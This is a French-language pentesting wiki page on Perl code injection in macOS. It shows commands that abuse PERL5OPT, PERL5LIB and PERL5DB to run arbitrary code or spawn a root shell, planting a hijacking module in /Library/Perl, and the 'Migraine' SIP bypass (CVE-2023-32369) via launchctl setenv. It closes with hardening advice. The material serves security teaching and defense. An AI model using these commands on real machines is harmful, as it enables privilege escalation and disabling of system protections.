# Injection d'applications Perl sur macOS

{{#include ../../../banners/hacktricks-training.md}}

## Via la variable d'environnement `PERL5OPT` & `PERL5LIB`

En utilisant la variable d'environnement **`PERL5OPT`**, il est possible de faire en sorte que **Perl** exécute des commandes arbitraires lorsque l'interpréteur démarre (même **avant** que la première ligne du script cible ne soit analysée). Par exemple, créez ce script :
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Maintenant, **exportez la variable d'environnement** et exécutez le script **perl** :
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Une autre option est de créer un module Perl (par exemple, `/tmp/pmod.pm`) :
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Et ensuite, utilisez les variables d'environnement afin que le module soit localisé et chargé automatiquement :
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Autres variables d'environnement intéressantes

* **`PERL5DB`** – lorsque l'interpréteur est démarré avec le **`-d`** (débbugueur), le contenu de `PERL5DB` est exécuté comme du code Perl *dans* le contexte du débbugueur. Si vous pouvez influencer à la fois l'environnement **et** les options de ligne de commande d'un processus Perl privilégié, vous pouvez faire quelque chose comme :

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # ouvrira un shell avant d'exécuter le script
```

* **`PERL5SHELL`** – sur Windows, cette variable contrôle quel exécutable de shell Perl utilisera lorsqu'il doit créer un shell. Elle est mentionnée ici uniquement pour complétude, car elle n'est pas pertinente sur macOS.

Bien que `PERL5DB` nécessite l'option `-d`, il est courant de trouver des scripts de maintenance ou d'installation qui sont exécutés en tant que *root* avec cette option activée pour un dépannage détaillé, rendant la variable un vecteur d'escalade valide.

## Via les dépendances (abus de @INC)

Il est possible de lister le chemin d'inclusion que Perl recherchera (**`@INC`**) en exécutant :
```bash
perl -e 'print join("\n", @INC)'
```
La sortie typique sur macOS 13/14 ressemble à :
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Certain dossiers retournés n'existent même pas, cependant **`/Library/Perl/5.30`** existe, n'est *pas* protégé par SIP et est *avant* les dossiers protégés par SIP. Par conséquent, si vous pouvez écrire en tant que *root*, vous pouvez déposer un module malveillant (par exemple, `File/Basename.pm`) qui sera *préférentiellement* chargé par tout script privilégié importé ce module.

> [!WARNING]
> Vous avez toujours besoin de **root** pour écrire dans `/Library/Perl` et macOS affichera une invite **TCC** demandant un *Accès Complet au Disque* pour le processus effectuant l'opération d'écriture.

Par exemple, si un script importe **`use File::Basename;`**, il serait possible de créer `/Library/Perl/5.30/File/Basename.pm` contenant du code contrôlé par l'attaquant.

## Contournement de SIP via l'Assistant de Migration (CVE-2023-32369 “Migraine”)

En mai 2023, Microsoft a divulgué **CVE-2023-32369**, surnommé **Migraine**, une technique de post-exploitation qui permet à un attaquant *root* de **contourner complètement la Protection de l'Intégrité du Système (SIP)**. 
Le composant vulnérable est **`systemmigrationd`**, un démon doté de **`com.apple.rootless.install.heritable`**. Tout processus enfant généré par ce démon hérite de l'attribution et fonctionne donc **en dehors** des restrictions SIP.

Parmi les enfants identifiés par les chercheurs se trouve l'interpréteur signé par Apple :
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Parce que Perl respecte `PERL5OPT` (et Bash respecte `BASH_ENV`), empoisonner l'*environnement* du démon suffit à obtenir une exécution arbitraire dans un contexte sans SIP :
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Lorsque `migrateLocalKDC` s'exécute, `/usr/bin/perl` démarre avec le malveillant `PERL5OPT` et exécute `/private/tmp/migraine.sh` *avant que SIP ne soit réactivé*. À partir de ce script, vous pouvez, par exemple, copier un payload à l'intérieur de **`/System/Library/LaunchDaemons`** ou attribuer l'attribut étendu `com.apple.rootless` pour rendre un fichier **indélébile**.

Apple a corrigé le problème dans macOS **Ventura 13.4**, **Monterey 12.6.6** et **Big Sur 11.7.7**, mais les systèmes plus anciens ou non corrigés restent exploitables.

## Recommandations de durcissement

1. **Effacer les variables dangereuses** – les launchdaemons ou les tâches cron privilégiés devraient démarrer avec un environnement pur (`launchctl unsetenv PERL5OPT`, `env -i`, etc.).
2. **Éviter d'exécuter des interprètes en tant que root** sauf si strictement nécessaire. Utilisez des binaires compilés ou réduisez les privilèges tôt.
3. **Scripts de fournisseur avec `-T` (mode de contamination)** afin que Perl ignore `PERL5OPT` et d'autres options non sécurisées lorsque la vérification de contamination est activée.
4. **Maintenir macOS à jour** – “Migraine” est entièrement corrigé dans les versions actuelles.

## Références

- Microsoft Security Blog – “Nouvelle vulnérabilité macOS, Migraine, pourrait contourner la protection de l'intégrité du système” (CVE-2023-32369), 30 mai 2023.
- Hackyboiz – “Recherche sur le contournement de SIP macOS (PERL5OPT & BASH_ENV)”, mai 2025.

{{#include ../../../banners/hacktricks-training.md}}
